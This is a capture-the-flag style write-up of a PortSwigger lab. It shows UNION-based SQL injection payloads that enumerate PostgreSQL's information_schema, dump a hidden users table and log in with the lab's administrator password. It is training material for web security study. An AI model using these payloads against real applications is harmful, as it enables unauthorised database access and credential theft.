# SQL Injection Attack — Listing Database Contents on Non-Oracle Databases

**Lab:** SQL injection attack, listing the database contents on non-Oracle databases
**Source:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Difficulty:** Practitioner

## Description

The product category filter is vulnerable to SQL injection, with results reflected in the response. The application has a login function, and the database (PostgreSQL) contains a table holding usernames and passwords — but the table and column names are unknown. Goal is to discover them via `information_schema`, dump the credentials, and log in as `administrator`.

## Solution

### Step 1: List all tables

Queried `information_schema.tables` to enumerate every table in the database:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

This returned a huge list of PostgreSQL system tables (`pg_*`, `information_schema.*`) mixed in with the application's own tables, including a suspicious one: `users_eprzco`.

![Table listing from information_schema.tables](content/assets/portswigger_sqli_non_oracle_contents/01-tables-listing.png)

**Mistake made along the way:** tried `SELECT *` from `information_schema.tables`, which errored — the table has far more columns than the outer query's 2-column layout, so the column counts didn't match. Also briefly targeted `pg_user`, a Postgres system table, instead of the real application table.

### Step 2: List the columns of the real users table

Once `users_eprzco` was identified, queried `information_schema.columns` to find its actual column names:

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_eprzco'--
```

This revealed two relevant columns: `username_czkngz` and `password_uvmtgl`.

![Column names for users_eprzco](content/assets/portswigger_sqli_non_oracle_contents/02-column-names.png)

**Mistake made along the way:** first attempt tried pulling `username`/`password` directly out of `information_schema.columns` — but that table only stores column *metadata*, not actual row data, so it can never return real credentials. Also used double quotes instead of single quotes for the string literal, which Postgres treats as an identifier, not a string.

### Step 3: Dump the credentials

With the real table and column names known, queried the actual data:

```sql
' UNION SELECT username_czkngz, password_uvmtgl FROM users_eprzco--
```

This returned all user credentials, including:

```
administrator : a9pqixc5ecnty6zuokcp
```

![Dumped username/password pairs including administrator](content/assets/portswigger_sqli_non_oracle_contents/03-dumped-credentials.png)

### Step 4: Log in as administrator

Used the recovered credentials on the login form:

- **Username:** `administrator`
- **Password:** `a9pqixc5ecnty6zuokcp`

![Login form filled with administrator credentials](content/assets/portswigger_sqli_non_oracle_contents/04-login-form.png)

### Result

Logged in successfully as `administrator`. Lab solved.

## Flag / Result

```
Logged in as administrator — lab solved
```

## Takeaway

On non-Oracle databases, `information_schema.tables` and `information_schema.columns` are the standard way to enumerate unknown table/column names before dumping data. `information_schema.columns` gives you *metadata only* — never confuse it with the real data table. Also watch quoting: Postgres uses single quotes for string literals, double quotes are for identifiers. Always match the outer query's column count (`SELECT *` will break UNION alignment).
